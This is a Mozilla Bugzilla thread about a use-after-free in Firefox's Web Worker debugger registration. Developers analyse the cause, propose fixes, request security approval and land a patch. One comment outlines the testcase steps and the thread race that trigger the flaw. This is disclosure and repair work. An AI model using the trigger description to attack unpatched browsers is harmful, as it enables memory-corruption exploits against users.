[Attachment #9060048](/attachment.cgi?id=9060048&action=edit "UAF_RegisterDebuggerMainThread_PoC.js") -
Attachment is obsolete: true

|  | [Looben Yang](/user_profile?user_id=506912)  Reporter |  |
| --- | --- | --- |
| [Comment 2](/show_bug.cgi?id=1546331#c2)• 6 years ago |
|  | |

Is there anyone looking at this bug?

It's been opened for over 3 weeks.

|  | [Yaron Tausky [:ytausky]](/user_profile?user_id=621888) |  |
| --- | --- | --- |
| [Comment 3](/show_bug.cgi?id=1546331#c3)• 6 years ago |
|  | |

We're kinda swamped right now, it can take some time unfortunately...

Flags: needinfo?(ytausky)

|  | [Andrew Overholt [:overholt]](/user_profile?user_id=442218) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1546331#a2965604_442218)• 6 years ago |

Priority: -- → P1

|  | [Looben Yang](/user_profile?user_id=506912)  Reporter |  |
| --- | --- | --- |
| [Comment 4](/show_bug.cgi?id=1546331#c4)• 6 years ago |
|  | |

What is the plan for this bug?

|  | [Hsin-Yi Tsai (she/her) [:hsinyi]](/user_profile?user_id=434964) |  |
| --- | --- | --- |
| [Comment 5](/show_bug.cgi?id=1546331#c5)• 6 years ago |
|  | |

(In reply to Looben Yang from [comment #4](/show_bug.cgi?id=1546331#c4 "RESOLVED FIXED - Web Workers - Use After Free in RegisterDebuggerMainThread()"))

> What is the plan for this bug?

We just landed a stack of patches in [bug 1559919](/show_bug.cgi?id=1559919 "RESOLVED FIXED - Finish the WorkerHolder cleanup") that we believe should improve worker invariants in general. We'll investigate if this is fixed.

|  | [Looben Yang](/user_profile?user_id=506912)  Reporter |  |
| --- | --- | --- |
| [Comment 6](/show_bug.cgi?id=1546331#c6)• 5 years ago |
|  | |

[bug 1559919](/show_bug.cgi?id=1559919 "RESOLVED FIXED - Finish the WorkerHolder cleanup") has been closed for over two weeks. Do you have a chance to verify if this bug is fixed?

|  | [Hsin-Yi Tsai (she/her) [:hsinyi]](/user_profile?user_id=434964) |  |
| --- | --- | --- |
| [Comment 7](/show_bug.cgi?id=1546331#c7)• 5 years ago |
|  | |

(In reply to Looben Yang from [comment #6](/show_bug.cgi?id=1546331#c6 "RESOLVED FIXED - Web Workers - Use After Free in RegisterDebuggerMainThread()"))

> [bug 1559919](/show_bug.cgi?id=1559919 "RESOLVED FIXED - Finish the WorkerHolder cleanup") has been closed for over two weeks. Do you have a chance to verify if this bug is fixed?

Unfortunately [bug 1559919](/show_bug.cgi?id=1559919 "RESOLVED FIXED - Finish the WorkerHolder cleanup") didn't help too much. We need further work here.

|  | [Looben Yang](/user_profile?user_id=506912)  Reporter |  |
| --- | --- | --- |
| [Comment 8](/show_bug.cgi?id=1546331#c8)• 5 years ago |
|  | |

(In reply to Hsin-Yi Tsai [:hsinyi] from [comment #7](/show_bug.cgi?id=1546331#c7 "RESOLVED FIXED - Web Workers - Use After Free in RegisterDebuggerMainThread()"))

> (In reply to Looben Yang from [comment #6](/show_bug.cgi?id=1546331#c6 "RESOLVED FIXED - Web Workers - Use After Free in RegisterDebuggerMainThread()"))
>
> > [bug 1559919](/show_bug.cgi?id=1559919 "RESOLVED FIXED - Finish the WorkerHolder cleanup") has been closed for over two weeks. Do you have a chance to verify if this bug is fixed?
>
> Unfortunately [bug 1559919](/show_bug.cgi?id=1559919 "RESOLVED FIXED - Finish the WorkerHolder cleanup") didn't help too much. We need further work here.

This bug missed the 90 day deadline advocated by Google. It never happens before with Mozilla.

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Comment 9](/show_bug.cgi?id=1546331#c9)• 5 years ago |
|  | |

See [bug 1545345 comment 13](/show_bug.cgi?id=1545345#c13 "RESOLVED FIXED - Web Workers - Use After Free with XMLHttpRequest"): this may be a manifestation of the same issue.

|  | [Yaron Tausky [:ytausky]](/user_profile?user_id=621888) |  |
| --- | --- | --- |
| [Comment 10](/show_bug.cgi?id=1546331#c10)• 5 years ago |
|  | |

I tried running it with the current nightly and I don't get an ASan message there. Does it need to run for a while before it happens, or does it happen pretty fast?

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1546331#a10583805_1689)• 5 years ago |

Assignee: nobody → htsai

|  | [Yaron Tausky [:ytausky]](/user_profile?user_id=621888) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1546331#a10902626_621888)• 5 years ago |

Assignee: htsai → ytausky

|  | [Jens Stutte [:jstutte]](/user_profile?user_id=646284) |  |
| --- | --- | --- |
| [Comment 11](/show_bug.cgi?id=1546331#c11)• 5 years ago • [Edited](/page.cgi?id=comment-revisions.html&bug_id=1546331&comment_id=14385915 "2 revisions") |
|  | |

From what I can see in the source related to the stack trace, we have a `WorkerPrivate` instance, that is freed through reference counting by:

`NS_INLINE_DECL_REFCOUNTING(WorkerPrivate)` [1]

and then accessed through a raw pointer in [3]

```
class UnregisterDebuggerMainThreadRunnable final : public mozilla::Runnable {
  WorkerPrivate* mWorkerPrivate;

```

As the ref-counting on `WorkerPrivate` has been introduced quite recently in [2], I assume, that not all pointers to such objects have been uplifted to be RefPtr and some of them may therefore outlive the instance. We should therefore check all `WorkerPrivate*` variables in our classes.

[1] <https://searchfox.org/mozilla-central/source/dom/workers/WorkerPrivate.h#109>

[2] introduced by <https://bugzilla.mozilla.org/show_bug.cgi?id=1435263> part 17

[3] <https://searchfox.org/mozilla-central/source/dom/workers/WorkerDebuggerManager.cpp#46>

|  | [Jens Stutte [:jstutte]](/user_profile?user_id=646284) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1546331#a13492285_646284)• 5 years ago |

Assignee: ytausky → bugmail

|  | [Jens Stutte [:jstutte]](/user_profile?user_id=646284) |  |
| --- | --- | --- |
| [Comment 12](/show_bug.cgi?id=1546331#c12)• 5 years ago |
|  | |

A quick search [1] in searchfox gives quite some occurences (no guarantee to be complete):

```
	dom/file/FileReaderSync.cpp
	dom/indexedDB/ActorsChild.cpp
	dom/notification/Notification.h
	dom/performance/PerformanceWorker.h
	dom/serviceworkers/ServiceWorkerEvents.cpp
	dom/serviceworkers/ServiceWorkerPrivate.cpp
	dom/workers/RuntimeService.cpp
	dom/workers/ScriptLoader.cpp
	dom/workers/WorkerDebugger.h
	dom/workers/WorkerDebuggerManager.cpp
	dom/workers/WorkerEventTarget.h
	dom/workers/WorkerPrivate.cpp
	dom/workers/WorkerPrivate.h
	dom/workers/WorkerRef.h
	dom/workers/WorkerRunnable.h
	dom/workers/WorkerScope.h
	dom/workers/WorkerThread.cpp
	dom/workers/WorkerThread.h
	dom/xhr/XMLHttpRequestWorker.cpp
	dom/xhr/XMLHttpRequestWorker.h

```

So there might be many side-effects of this in different occasions.

[1] [https://searchfox.org/mozilla-central/search?q=WorkerPrivate\*+m&path=](https://searchfox.org/mozilla-central/search?q=WorkerPrivate*+m&path=)

|  | [Jens Stutte [:jstutte]](/user_profile?user_id=646284) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1546331#a13508096_646284)• 5 years ago |

Assignee: bugmail → perry

|  | [Jens Stutte [:jstutte]](/user_profile?user_id=646284) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1546331#a13577927_646284)• 5 years ago |

See Also: → [1539508](/show_bug.cgi?id=1539508 "NEW - [meta] Simplify WorkerPrivate's end-of-life flow")

|  | [Liz Henry (:lizzard) (relman/hg->git project)](/user_profile?user_id=451704) |  |
| --- | --- | --- |
| [Comment 13](/show_bug.cgi?id=1546331#c13)• 5 years ago |
|  | |

Is fixing this dependent on fixing [bug 1539508](/show_bug.cgi?id=1539508 "NEW - [meta] Simplify WorkerPrivate's end-of-life flow")? If so then please make that bug a higher priority. I'll follow up in email.

[status-firefox67](/buglist.cgi?f1=cf_status_firefox67&o1=isnotempty):
[?](/buglist.cgi?f1=cf_status_firefox67&o1=equals&v1=%3F) → [wontfix](/buglist.cgi?f1=cf_status_firefox67&o1=equals&v1=wontfix)
[status-firefox68](/buglist.cgi?f1=cf_status_firefox68&o1=isnotempty):
[affected](/buglist.cgi?f1=cf_status_firefox68&o1=equals&v1=affected) → [wontfix](/buglist.cgi?f1=cf_status_firefox68&o1=equals&v1=wontfix)
[status-firefox69](/buglist.cgi?f1=cf_status_firefox69&o1=isnotempty):
--- → [wontfix](/buglist.cgi?f1=cf_status_firefox69&o1=equals&v1=wontfix)
[status-firefox70](/buglist.cgi?f1=cf_status_firefox70&o1=isnotempty):
--- → [affected](/buglist.cgi?f1=cf_status_firefox70&o1=equals&v1=affected)
[status-firefox71](/buglist.cgi?f1=cf_status_firefox71&o1=isnotempty):
--- → [affected](/buglist.cgi?f1=cf_status_firefox71&o1=equals&v1=affected)
[status-firefox-esr60](/buglist.cgi?f1=cf_status_firefox_esr60&o1=isnotempty):
[?](/buglist.cgi?f1=cf_status_firefox_esr60&o1=equals&v1=%3F) → [wontfix](/buglist.cgi?f1=cf_status_firefox_esr60&o1=equals&v1=wontfix)
[tracking-firefox71](/buglist.cgi?f1=cf_tracking_firefox71&o1=isnotempty):
--- → [+](/buglist.cgi?f1=cf_tracking_firefox71&o1=equals&v1=%2B)Flags: needinfo?(perry)Flags: needinfo?(jstutte)

|  | [Jens Stutte [:jstutte]](/user_profile?user_id=646284) |  |
| --- | --- | --- |
| [Comment 14](/show_bug.cgi?id=1546331#c14)• 5 years ago |
|  | |

@Liz: Not necessarily. I would rather recommend to fix the evident things (use of raw pointers) here as part of this bug and to leave [bug 1539508](/show_bug.cgi?id=1539508 "NEW - [meta] Simplify WorkerPrivate's end-of-life flow") at P2, given that it is very unspecific and will probably lead to a meta-bug with several tasks.

@Perry: Agree?

Flags: needinfo?(jstutte)

|  | [Perry Jiang [:perry] [no longer employee, use ni?]](/user_profile?user_id=593321) |  |
| --- | --- | --- |
| [Comment 15](/show_bug.cgi?id=1546331#c15)• 5 years ago |
|  | |

(In reply to Jens Stutte [:jstutte] from [comment #14](/show_bug.cgi?id=1546331#c14 "RESOLVED FIXED - Web Workers - Use After Free in RegisterDebuggerMainThread()"))

> @Perry: Agree?

I agree, [bug 1539508](/show_bug.cgi?id=1539508 "NEW - [meta] Simplify WorkerPrivate's end-of-life flow") seems to have a much broader scope (but may indeed be addressing the underlying cause of this one).

Flags: needinfo?(perry)

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1546331#a15670278_1689)• 5 years ago |

[status-firefox70](/buglist.cgi?f1=cf_status_firefox70&o1=isnotempty):
[affected](/buglist.cgi?f1=cf_status_firefox70&o1=equals&v1=affected) → [fix-optional](/buglist.cgi?f1=cf_status_firefox70&o1=equals&v1=fix-optional)
[status-firefox72](/buglist.cgi?f1=cf_status_firefox72&o1=isnotempty):
--- → [affected](/buglist.cgi?f1=cf_status_firefox72&o1=equals&v1=affected)
[status-firefox-esr68](/buglist.cgi?f1=cf_status_firefox_esr68&o1=isnotempty):
--- → [affected](/buglist.cgi?f1=cf_status_firefox_esr68&o1=equals&v1=affected)
[tracking-firefox70](/buglist.cgi?f1=cf_tracking_firefox70&o1=isnotempty):
--- → [+](/buglist.cgi?f1=cf_tracking_firefox70&o1=equals&v1=%2B)
[tracking-firefox72](/buglist.cgi?f1=cf_tracking_firefox72&o1=isnotempty):
--- → [+](/buglist.cgi?f1=cf_tracking_firefox72&o1=equals&v1=%2B)
[tracking-firefox-esr68](/buglist.cgi?f1=cf_tracking_firefox_esr68&o1=isnotempty):
--- → [71+](/buglist.cgi?f1=cf_tracking_firefox_esr68&o1=equals&v1=71%2B)See Also: → [CVE-2020-12387](/show_bug.cgi?id=1545345 "RESOLVED FIXED - Web Workers - Use After Free with XMLHttpRequest")

|  | [Eden Chuang[:edenchuang]](/user_profile?user_id=516138)  Assignee |  |
| --- | --- | --- |
| [Comment 16](/show_bug.cgi?id=1546331#c16)• 5 years ago |
|  | |

I take this bug from Perry.

I will start this bug and related bugs in the later of this week.

Assignee: perry → echuangStatus: NEW → ASSIGNED

|  | [Julien Cristau [:jcristau]](/user_profile?user_id=580382) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1546331#a15806946_580382)• 5 years ago |

[status-firefox70](/buglist.cgi?f1=cf_status_firefox70&o1=isnotempty):
[fix-optional](/buglist.cgi?f1=cf_status_firefox70&o1=equals&v1=fix-optional) → [wontfix](/buglist.cgi?f1=cf_status_firefox70&o1=equals&v1=wontfix)

|  | [Eden Chuang[:edenchuang]](/user_profile?user_id=516138)  Assignee |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1546331#a15906677_516138)• 5 years ago |

See Also: → [1557732](/show_bug.cgi?id=1557732 "VERIFIED FIXED - Assertion failure: js::GetNonCCWObjectRealm(wrapper) == js::GetContextRealm(cx), at /builds/worker/workspace/build/src/dom/workers/WorkerRunnable.cpp:345")

|  | [Eden Chuang[:edenchuang]](/user_profile?user_id=516138)  Assignee |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1546331#a16430201_516138)• 5 years ago |

Flags: needinfo?(bugmail) → needinfo?(loobenyang)See Also: [1539508](/show_bug.cgi?id=1539508 "NEW - [meta] Simplify WorkerPrivate's end-of-life flow"), [CVE-2020-12387](/show_bug.cgi?id=1545345 "RESOLVED FIXED - Web Workers - Use After Free with XMLHttpRequest"), [1557732](/show_bug.cgi?id=1557732 "VERIFIED FIXED - Assertion failure: js::GetNonCCWObjectRealm(wrapper) == js::GetContextRealm(cx), at /builds/worker/workspace/build/src/dom/workers/WorkerRunnable.cpp:345") →

|  | [Looben Yang](/user_profile?user_id=506912)  Reporter |  |
| --- | --- | --- |
| [Comment 17](/show_bug.cgi?id=1546331#c17)• 5 years ago |
|  | |

Hi Eden, what can I help?

Flags: needinfo?(loobenyang)

|  | [Eden Chuang[:edenchuang]](/user_profile?user_id=516138)  Assignee |  |
| --- | --- | --- |
| [Comment 18](/show_bug.cgi?id=1546331#c18)• 5 years ago |
|  | |

Hi Looben, sorry to the wrong mark ni to you.

I tested with the Firefox nightly, but could not reproduce the issue. I think it might be fixed by patches between 68 to 70.

However, it could be reproduced with Firefox 68 esr.

What the testcase do

main page:

1. Create a gc function
2. Create a dedicated worker worker 0 (worker0.js) and set worker.onerror to call gc function().
3. Create a dedicated worker worker 1 (worker1.js)
4. set a timeout 200 ms, then to reload page.

worker0.js:

1. Create a nested dedicated worker embedworker1 (embedworker1.js)

worker1.js:

1. Set self.onerror to call embedworker0.terminate()
2. Create a nested dedicated worker embedworker0 (embedworker0.js)

When creating a worker, WorkerPrivate constructor also calls worker->EnableDebugger() and registers a debugger in WorkerDebuggerManager after the worker is scheduled. If the worker is not a top-level worker, RegisterDebuggerMainThreadRunnable is created and dispatched to the main thread. If there is no debugger listener in WorkerDebuggerManager, continuing the worker constructing, otherwise waiting for the debugger registration finishes.

When the reload is called, workers go into the finishing process. WorkerFinishedRunnable will be created and delete the corresponding WorkerPrivate.

This is an intermittent issue. To hit the UAF, the RegisterDebuggerMainThreadRunnable must be executed after WorkerFinishedRunnable execution.

|  | [Eden Chuang[:edenchuang]](/user_profile?user_id=516138)  Assignee |  |
| --- | --- | --- |
| [Comment 19](/show_bug.cgi?id=1546331#c19)• 5 years ago |
|  | |

Jens's suggestion in [comment 11](/show_bug.cgi?id=1546331#c11 "RESOLVED FIXED - Web Workers - Use After Free in RegisterDebuggerMainThread()") does not work. Change raw pointer to RefPtr would change the lifecycle of WorkerPrivate, and hit assertion expects the WorkerPrivate should be nullptr.

|  | [Jens Stutte [:jstutte]](/user_profile?user_id=646284) |  |
| --- | --- | --- |
| [Comment 20](/show_bug.cgi?id=1546331#c20)• 5 years ago |
|  | |

Thanks for sorting this out. So the root cause is an unexpected order of calling (WorkerFinishedRunnable before RegisterDebuggerMainThreadRunnable) on the same object. Fix this order will probably heal this and make things work.

But I still assume, that someday we should take a closer look on [bug 1539508](/show_bug.cgi?id=1539508 "NEW - [meta] Simplify WorkerPrivate's end-of-life flow") in order to increase overall robustness. All those raw pointers on a ref-counted object look at least suspicious. And from a security point of view, an unexpected order of calls should never be able to break things up to a UAF. Especially if the originating call is potentially in a different process, we should never rely on having these calls in a specific order but fail gently, if something unexpected happens (such that at worst the calling process breaks, not ours).

|  | [Andrew Sutherland [:asuth] (he/him)](/user_profile?user_id=151407) |  |
| --- | --- | --- |
| [Comment 21](/show_bug.cgi?id=1546331#c21)• 5 years ago |
|  | |

In general the solution for situations like this is to give the runnables in question ThreadSafeWorkerRef instances (which attach to a StrongWorkerRef). The complexity here is that WorkerRefs are explicitly designed so that they are created on the worker thread itself, but WorkerPrivate::Constructor is running on the parent of the worker.

The assertion-book-keeping for this comes from NS\_DECL\_OWNINGTHREAD / nsAutoOwningThread. Because of how it's implemented, this makes it hard to hack a state update to a pre-emptively created StrongWorkerRef. (It saves off the current thread at creation time into a private mThread field which is then used for all of the `NS_ASSERT_OWNINGTHREAD` checks.)

The core of a potential solution might be:

* Create a subclass of ThreadSafeWorkerRef called something like CreationTimeThreadSafeWorkerRef that exists for this exact case. It is ThreadSafeWorkerRef for the code that is creating the worker before it exists.
* CTTSWR (CreationTimeThreadSafeWorkerRef) would be initialized *without* its `RefPtr<StrongWorkerRef> mRef` being initialized. It would strongly assert that the WorkerPrivate's mParentStatus is Pending. (WorkerPrivate::Start changes it to Running in RuntimeService::ScheduleWorker).
* WorkerPrivate would have a private field `RefPtr<CTTSWR> mCreationTimeRef`. Because the CTTSWR's are threadsafe refcounted, there really only ever needs to be just the one.
* WorkerThreadPrimaryRunnable::Run would call a method on mCreationTimeRef that causes it to create StrongWorkerRef instances. It would then clear mCreationTimeRef because no one else should use it (and it's literally a cyclic reference). It would likely make sense to do this right after the assert at <https://searchfox.org/mozilla-central/rev/59de675101da711520c0bb6e34a1ea2372e7ddbb/dom/workers/RuntimeService.cpp#2297>. My location rationale there is that it's after the SetThreadHelper has called WorkerPrivate::SetWorkerPrivateInWorkerThread and set and configured `mThread`. (Note that the method also dispatches the mPreStartRunnables, but dispatch just means to enqueue them, they don't get run. We're just transferring them to the actual event target that will process them.)
* We create the CTTSWR prior to the call to RuntimeService::RegisterWorker because that's what calls WorkerPrivate::Start. So somewhere just above <https://searchfox.org/mozilla-central/rev/59de675101da711520c0bb6e34a1ea2372e7ddbb/dom/workers/WorkerPrivate.cpp#2362> probably. We then hand that to the call to WorkerPrivate::EnableDebugger to use if needed.
* Add a diagnostic assertion to WorkerPrivate::ClearSelfAndParentEventTargetRef that the mCreationTimeRef is empty.

The one major edge-case to be concerned about is the case where the worker is told to terminate before it ever gets a chance to be scheduled to run on a thread or if we experience resource exhaustion that causes us to be unable to create a thread. In that case, the CTTSWR is providing us with zero guarantees about WorkerPrivate::mSelfRef being maintained. The call to `WorkerPrivate::ScheduleDeletion(WorkerPrivate::WorkerNeverRan)` at <https://searchfox.org/mozilla-central/rev/59de675101da711520c0bb6e34a1ea2372e7ddbb/dom/workers/WorkerPrivate.cpp#1598> will schedule the (TopLevel)WorkerFinishedRunnable which will clear the self-reference.

I'm not quite as sure what to do about that situation to keep things clean. The main options would seem to be:

* Have CTTSWR hold a strong `RefPtr<WorkerPrivate>` until it transfers to a StrongWorkerRef. This might run afoul of what Eden is talking about in [comment 19](/show_bug.cgi?id=1546331#c19 "RESOLVED FIXED - Web Workers - Use After Free in RegisterDebuggerMainThread()").
* Have `WorkerPrivate::ScheduleDeletion(WorkerPrivate::WorkerNeverRan)` defer dispatching the (TopLevel)WorkerFinishedRunnable until its destructor fires.
  + Note that the logic at <https://searchfox.org/mozilla-central/rev/e8e4a8641f3e6728ea42ae30905ce2145bfd5568/dom/workers/WorkerPrivate.cpp#3283-3288> seems to be incompatible with the WorkerNeverRan call pattern. Although this hunk was introduced in [Bug 1504638](/show_bug.cgi?id=1504638 "RESOLVED FIXED - Protect worker thread-private members of WorkerPrivate from access from other threads"), it was replacing an `AssertIsOnWorkerThread()` call at <https://searchfox.org/mozilla-central/rev/3f79d90ac57fb4d13eac6f68e44ca79575d9d25d/dom/workers/WorkerPrivate.cpp#3736> that was equally as incorrect AFAICT. (I thought the assertion might actually be a [vacuously true](https://en.wikipedia.org/wiki/Vacuous_truth) sort of thing because the mThread wouldn't have been assigned, but it seems like the assertion would indeed fire for a null mThread.)

In both cases, we'd of course need to drop the mCreationTimeRef reference from WorkerPrivate around the time `WorkerPrivate::ScheduleDeletion(WorkerPrivate::WorkerNeverRan)` is invoked so that we don't have a cycle that ends up leaking the WorkerPrivate.

|  | [Eden Chuang[:edenchuang]](/user_profile?user_id=516138)  Assignee |  |
| --- | --- | --- |
| [Comment 22](/show_bug.cgi?id=1546331#c22)• 5 years ago • [Edited](/page.cgi?id=comment-revisions.html&bug_id=1546331&comment_id=14468814 "1 revision") |
|  | |

This is a simple thread interleaving problem. UAF can only happen on the nested worker case.

For top-level worker, instead of creating a RegisterDebuggerMainThreadRunnable, calling RegisterWorkerDebuggerMainThread directly, and debugger registration is completed before exiting WorkerPrivatre::Constructor and WorkerThreadPrimaryRunnable::Run. Therefore we never get the UAF on top-level worker case.

However, for nested workers, since the parent thread is not the main thread, WorkerPrivate::EnableDebugger() finally creating RegisterDebuggerMainThreadRunnable then dispatching it to main thread to register debugger. If there is no listeners on WorkerDebuggerManager, the parent thread is not blocked, and WorkerPrivate::Constructor continues the construction.

<https://searchfox.org/mozilla-esr68/source/dom/workers/WorkerDebuggerManager.cpp#247>

That means WorkerThreadPrimaryRunnable::Run could be executed before RegisterDebuggerMainThreadRunnable::Run. For the situation, reload() could make WorkerThreadPrimaryRunnable::Run() exit the DoRunLoop immediately and call WorkerPrivate::ScheduleDeleteion. So if RegisterDebuggerMainThreadRunnable::Run is executed after that, we hit the use after free case.

To not change the WorkerPrivate lifecycle, followings could be the considered solutions.

1. Always call aWorkerPrivate->WaitForIsDebuggerRegistered(true) in the case, not only for the case if we have listeners on WorkerDebuggerManager.

   This simplest solution makes the WorkerPrivate construction behavior is the same with the top-level workers, but it introduces the overhead for the debugger is not using.

   <https://searchfox.org/mozilla-esr68/source/dom/workers/WorkerDebuggerManager.cpp#234>
2. Cancel RegisterDebuggerMainThreadRunnable() if it is not executed when calling WorkerPrivate::ScheduleDeleteion

   This solution is much more complicated for implementation. We need to remember the RegisterDebuggerMainThreadRunnable() in some where, probably in WorkerPrivate, and check is it executed when calling WorkerPrivate::ScheduleDeleteion() and cancel it at the mean time do not execute WorkerPrivate::DisableDebugger. Of course, I think Andrew's suggestion in [comment 21](/show_bug.cgi?id=1546331#c21 "RESOLVED FIXED - Web Workers - Use After Free in RegisterDebuggerMainThread()") is also doable. I think it is also another way to cancel RegisterDebuggerMainThreadRunnable() by checking the WorkerPrivate status by itself.
Flags: needinfo?(bugmail)

|  | [Eden Chuang[:edenchuang]](/user_profile?user_id=516138)  Assignee |  |
| --- | --- | --- |
| [Comment 23](/show_bug.cgi?id=1546331#c23)• 5 years ago |
|  | |

Attached file
[Missing call to WaitForIsDebuggerRegistered](attachment.cgi?id=9107143)
— [Details](attachment.cgi?id=9107143&action=edit)

During constructing the WorkerPrivate for nested workers, WorkerPrivate::EnableDebugger eventually creates RegisterDebuggerMainThreadRunnable to register worker debugger on the main thread. However, if WorkerDebuggerManager has no listeners, which means no one using the debugger, the WorkerPrivate construction will not be blocked, then the worker will start to wait for events finally.

A situation could happen, the worker is finishing/terminating by reloading or other reasons, but the main thread still doesn't execute the dispatched RegisterDebuggerMainThreadRunnable. And UAF occurs when running the runnable after killing the worker.

This patch detecting if the dispatched RegisterDebuggerMainThreadRunnable is executed or not while finishing the worker. If it is not executed, the worker finishing will be blocked until the runnable is completed.

This patch is not risky since WorkerPrivate::DisableDebug must be called when finishing the worker in the original code. And WorkerPrivate::DisableDebug also blocks the worker finishing.

|  | [Eden Chuang[:edenchuang]](/user_profile?user_id=516138)  Assignee |  |
| --- | --- | --- |
| [Comment 24](/show_bug.cgi?id=1546331#c24)• 5 years ago |
|  | |

<https://treeherder.mozilla.org/#/jobs?repo=try&revision=7220c55559d10501eca5b1d9ebfe4f16e9924565&selectedJob=274886097>

|  | [Liz Henry (:lizzard) (relman/hg->git project)](/user_profile?user_id=451704) |  |
| --- | --- | --- |
| [Comment 25](/show_bug.cgi?id=1546331#c25)• 5 years ago |
|  | |

Eden, did you mean to request sec-approval?

And, is this something that might be OK for uplift to release 70?

[status-firefox70](/buglist.cgi?f1=cf_status_firefox70&o1=isnotempty):
[wontfix](/buglist.cgi?f1=cf_status_firefox70&o1=equals&v1=wontfix) → [affected](/buglist.cgi?f1=cf_status_firefox70&o1=equals&v1=affected)Flags: needinfo?(tom)Flags: needinfo?(echuang)Flags: needinfo?(dveditz)

|  | [Eden Chuang[:edenchuang]](/user_profile?user_id=516138)  Assignee |  |
| --- | --- | --- |
| [Comment 26](/show_bug.cgi?id=1546331#c26)• 5 years ago |
|  | |

Comment on [attachment 9107143](/attachment.cgi?id=9107143 "Missing call to WaitForIsDebuggerRegistered") [[details]](/attachment.cgi?id=9107143&action=edit "Missing call to WaitForIsDebuggerRegistered")

Missing call to WaitForIsDebuggerRegistered

### Security Approval Request

* **How easily could an exploit be constructed based on the patch?**: Not sure. But I think it might be not easy to realize the problem from the patch.
* **Do comments in the patch, the check-in comment, or tests included in the patch paint a bulls-eye on the security problem?**: Unknown
* **Which older supported branches are affected by this flaw?**: 68
* **If not all supported branches, which bug introduced the flaw?**: None
* **Do you have backports for the affected branches?**: Yes
* **If not, how different, hard to create, and risky will they be?**:
* **How likely is this patch to cause regressions; how much testing does it need?**: I think the patch should not cause regressions easy.
Flags: needinfo?(echuang)
[Attachment #9107143](/attachment.cgi?id=9107143&action=edit "Missing call to WaitForIsDebuggerRegistered") -
Flags: sec-approval?

|  | [Eden Chuang[:edenchuang]](/user_profile?user_id=516138)  Assignee |  |
| --- | --- | --- |
| [Comment 27](/show_bug.cgi?id=1546331#c27)• 5 years ago |
|  | |

Liz, yes, I think it is OK for uplift to release 70 and esr68.

Flags: needinfo?(bugmail)

|  | [Tom Ritter [:tjr]](/user_profile?user_id=578488) |  |
| --- | --- | --- |
| [Comment 28](/show_bug.cgi?id=1546331#c28)• 5 years ago |
|  | |

Comment on [attachment 9107143](/attachment.cgi?id=9107143 "Missing call to WaitForIsDebuggerRegistered") [[details]](/attachment.cgi?id=9107143&action=edit "Missing call to WaitForIsDebuggerRegistered")

Missing call to WaitForIsDebuggerRegistered

I'd like to do the following:

1. Move the comment from the commit message. We have it in [Comment 23](/show_bug.cgi?id=1546331#c23 "RESOLVED FIXED - Web Workers - Use After Free in RegisterDebuggerMainThread()") for historical details. Let's make the commit message something like "Missing call to WaitForIsDebuggerRegistered"
2. In the comment in the source code, remove the mention of 'nested workers'
3. Let's land this later in the cycle. Looks like soft code freeze is 11/25, so let's land it 11/14 or 11/15.
Flags: needinfo?(tom)Flags: needinfo?(dveditz)
[Attachment #9107143](/attachment.cgi?id=9107143&action=edit "Missing call to WaitForIsDebuggerRegistered") -
Flags: sec-approval? → sec-approval+

|  | [Liz Henry (:lizzard) (relman/hg->git project)](/user_profile?user_id=451704) |  |
| --- | --- | --- |
| [Comment 29](/show_bug.cgi?id=1546331#c29)• 5 years ago |
|  | |

If we want to get it into 70.0.2, that's possible, but I'll make sure the timing will work with landing on 11/14 or I'll come back and ask to land it a bit sooner.

|  | [Liz Henry (:lizzard) (relman/hg->git project)](/user_profile?user_id=451704) |  |
| --- | --- | --- |
| [Comment 30](/show_bug.cgi?id=1546331#c30)• 5 years ago |
|  | |

As of today we don't have a driver for 70.0.2 any more. So, we can probably target this for 71 as planned in [comment 28](/show_bug.cgi?id=1546331#c28 "RESOLVED FIXED - Web Workers - Use After Free in RegisterDebuggerMainThread()").

Meanwhile, I'll keep tracking this in case another driver comes up for 70.0.2.

|  | [Phabricator Automation](/user_profile?user_id=600971) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1546331#a17524098_600971)• 5 years ago |

[Attachment #9107143](/attachment.cgi?id=9107143&action=edit "Missing call to WaitForIsDebuggerRegistered") -
Attachment description: call WaitForIsDebuggerRegistered(true) in WorkerPrivate::DisableDebugger for the nested worker → Missing call to WaitForIsDebuggerRegistered

|  | [Eden Chuang[:edenchuang]](/user_profile?user_id=516138)  Assignee |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1546331#a17804037_516138)• 5 years ago |

Keywords: [checkin-needed-tb](/buglist.cgi?keywords=checkin-needed-tb&resolution=---)

|  | [Sebastian Hengst [:aryx] (needinfo me if it's about an intermittent or backout)](/user_profile?user_id=258347) |  |
| --- | --- | --- |
| [Comment 31](/show_bug.cgi?id=1546331#c31)• 5 years ago |
|  | |

<https://hg.mozilla.org/integration/autoland/rev/cde2ca39e32b7e344ebd4f6eac900c7ac1dee26a>

Please use the tag 'CheckinNeeded' in Phabricator in the future - the workflow with the 'checkin-needed' keyword is not supported anymore.

Keywords: [checkin-needed-tb](/buglist.cgi?keywords=checkin-needed-tb&resolution=---)

|  | [Sebastian Hengst [:aryx] (needinfo me if it's about an intermittent or backout)](/user_profile?user_id=258347) |  |
| --- | --- | --- |
| [Comment 32](/show_bug.cgi?id=1546331#c32)• 5 years ago |
|  | |

<https://hg.mozilla.org/mozilla-central/rev/cde2ca39e32b>

Group: dom-core-security → core-security-releaseStatus: ASSIGNED → RESOLVEDClosed: 5 years ago
[status-firefox72](/buglist.cgi?f1=cf_status_firefox72&o1=isnotempty):
[affected](/buglist.cgi?f1=cf_status_firefox72&o1=equals&v1=affected) → [fixed](/buglist.cgi?f1=cf_status_firefox72&o1=equals&v1=fixed)Resolution: --- → FIXEDTarget Milestone: --- → mozilla72

